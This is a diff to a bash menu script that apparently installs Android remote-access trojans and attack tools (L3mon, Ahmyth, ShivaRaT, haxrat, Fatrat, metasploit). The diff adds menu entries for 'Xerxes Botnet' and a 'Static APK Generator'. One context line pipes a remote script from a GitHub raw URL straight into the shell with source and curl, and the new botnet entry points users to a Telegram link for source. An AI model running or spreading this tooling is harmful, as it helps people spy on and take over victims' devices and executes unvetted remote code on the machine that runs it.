@@ -11,15 +11,17 @@ White='\033[0;37m'
 ratchech()
 {
 echo -e "
- ${Green} 1.${Yellow} L3mon
- ${Green} 2.${Yellow} L3MON-static
- ${Green} 3.${Yellow} Fatrat
- ${Green} 4.${Yellow} Ahmyth
- ${Green} 5.${Yellow} ShivaRaT
- ${Green} 6.${Yellow} Airavat
- ${Green} 7.${Yellow} Airavat PRO
- ${Green} 8.${Yellow} haxrat
- ${Green} 9.${Yellow} metasploit
+ ${Green} 01.${Yellow} L3mon
+ ${Green} 02.${Yellow} L3MON-static
+ ${Green} 03.${Yellow} Fatrat
+ ${Green} 04.${Yellow} Ahmyth
+ ${Green} 05.${Yellow} ShivaRaT
+ ${Green} 06.${Yellow} Airavat
+ ${Green} 07.${Yellow} Airavat PRO
+ ${Green} 08.${Yellow} haxrat
+ ${Green} 09.${Yellow} metasploit
+ ${Green} 10.${Yellow} Xerxes Botnet
+ ${Green} 11.${Yellow} Static APK Generator
  ${Green} 0.${Yellow} exit
  "
 echo -en " ${Green}[${Yellow}E${Green}] ${White}Please type input: ${Green}"
@@ -103,6 +105,21 @@ echo;;
 cd $HOME
 rm 2023fix > /dev/null 2>&1 &
 source <(curl -fsSL https://raw.githubusercontent.com/database2022/l3monfix/main/2023fix)
+echo;;
+
+10)
+#Script start here
+cd $HOME
+rm 2023fix > /dev/null 2>&1 &
+echo -e "${Green} Download the source https://t.me/efxtv/2109  ${clean}"
+
+echo;;
+
+11)
+#Script start here
+cd $HOME
+rm 2023fix > /dev/null 2>&1 &
+echo -e "${Green} Soon ${clean}"
 echo;;
   
 0)
